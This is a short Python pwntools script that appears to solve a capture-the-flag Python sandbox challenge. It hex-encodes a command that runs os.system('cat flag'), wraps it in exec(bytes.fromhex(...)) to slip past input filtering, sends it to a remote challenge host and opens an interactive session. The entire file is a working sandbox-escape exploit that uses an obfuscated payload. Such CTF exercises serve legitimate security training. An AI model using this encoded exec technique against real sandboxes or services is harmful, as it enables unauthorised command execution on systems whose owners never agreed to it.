#!/usr/bin/env python3
from pwn import *
COMMAND = b"import os;os.system('cat flag')".hex()
EXPLOIT = f'exec(bytes.fromhex("{COMMAND}").decode())'
r = remote("sandbox_v1.challs.olicyber.it", 35003)
r.recvuntil(b'>>> ')
r.sendline(EXPLOIT)
r.interactive()